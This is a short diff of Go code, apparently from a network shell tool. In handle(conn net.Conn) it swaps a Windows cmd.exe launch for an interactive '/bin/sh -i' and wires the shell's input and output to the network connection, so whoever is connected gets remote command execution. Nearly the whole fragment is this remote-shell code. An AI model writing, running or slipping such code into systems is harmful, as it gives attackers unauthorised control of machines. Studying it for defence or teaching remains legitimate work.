@@ -14,7 +14,8 @@ func handle(conn net.Conn) {
 	 * so that we can use it for stdin and stdout.
 	 * For Windows use exec.Command("cmd.exe")
 	 */
-	cmd := exec.Command("cmd.exe")
+	// cmd := exec.Command("cmd.exe")
+	cmd := exec.Command("/bin/sh", "-i")
 	rp, wp := io.Pipe()
 	// Set stdin to our connection
 	cmd.Stdin = conn
